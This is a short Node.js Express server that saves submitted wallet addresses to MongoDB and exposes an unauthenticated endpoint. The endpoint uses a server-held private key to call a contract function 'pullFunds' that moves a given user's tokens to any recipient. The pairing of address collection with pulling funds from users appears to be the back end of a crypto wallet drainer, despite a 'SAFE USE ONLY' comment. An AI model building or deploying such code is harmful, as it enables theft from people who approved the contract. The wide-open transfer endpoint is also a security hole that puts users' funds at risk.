const express = require("express");
const mongoose = require("mongoose");
const { ethers } = require("ethers");
require("dotenv").config();

const app = express();
app.use(express.json());

// --------------------
// DATABASE
// --------------------
mongoose.connect("mongodb://127.0.0.1:27017/mydb");

// Schema
const UserSchema = new mongoose.Schema({
    address: String,
    timestamp: { type: Date, default: Date.now }
});
const UserModel = mongoose.model("users", UserSchema);

// --------------------
// API: RECEIVE ADDRESS
// --------------------
app.post("/store-user", async (req, res) => {
    try {
        const { address } = req.body;

        await UserModel.create({ address });

        res.json({ success: true, saved: address });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// --------------------
// BLOCKCHAIN SETUP (SAFE USE ONLY)
// --------------------
const provider = new ethers.JsonRpcProvider(process.env.RPC);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const contractAddress = process.env.CONTRACT;
const abi = [
  "function pullFunds(address token, address user, address recipient, uint256 amount) external"
];

const contract = new ethers.Contract(contractAddress, abi, wallet);

// --------------------
// API: PERFORM CONTRACT CALL
// --------------------
app.post("/run-contract", async (req, res) => {
    try {
        const { token, user, recipient, amount } = req.body;

        console.log("Sending TX…");

        const tx = await contract.pullFunds(
            token,
            user,
            recipient,
            amount
        );

        await tx.wait();

        res.json({
            success: true,
            hash: tx.hash
        });

    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// --------------------
app.listen(3000, () => console.log("Server running on port 3000"));
